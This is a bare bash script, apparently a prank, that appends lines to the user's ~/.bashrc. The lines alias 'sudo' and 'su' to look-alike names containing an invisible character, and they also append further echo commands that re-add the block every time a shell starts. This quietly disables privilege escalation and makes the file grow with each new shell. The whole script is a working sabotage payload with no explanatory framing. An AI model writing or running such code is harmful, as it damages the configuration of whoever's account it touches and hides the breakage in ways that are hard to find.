echo 'LOL=1 ' >> ~/.bashrc
echo 'if [ $LOL -gt 3 ]' >> ~/.bashrc
echo 'then' >> ~/.bashrc
echo 'alias sudo=sud‎o' >> ~/.bashrc
echo 'alias su=s‎u' >> ~/.bashrc
echo 'fi' >> ~/.bashrc
echo 'LOL=$(($LOL+1))' >> ~/.bashrc

echo "echo 'if [ \$LOL -gt 3 ]' >> ~/.bashrc" >> ~/.bashrc
echo "echo 'then' >> ~/.bashrc" >> ~/.bashrc
echo "echo 'alias sudo=sud‎o' >> ~/.bashrc" >> ~/.bashrc
echo "echo 'alias su=s‎u' >> ~/.bashrc" >> ~/.bashrc
echo "echo 'fi' >> ~/.bashrc" >> ~/.bashrc
echo "echo 'LOL=\$((\$LOL+1))' >> ~/.bashrc" >> ~/.bashrc
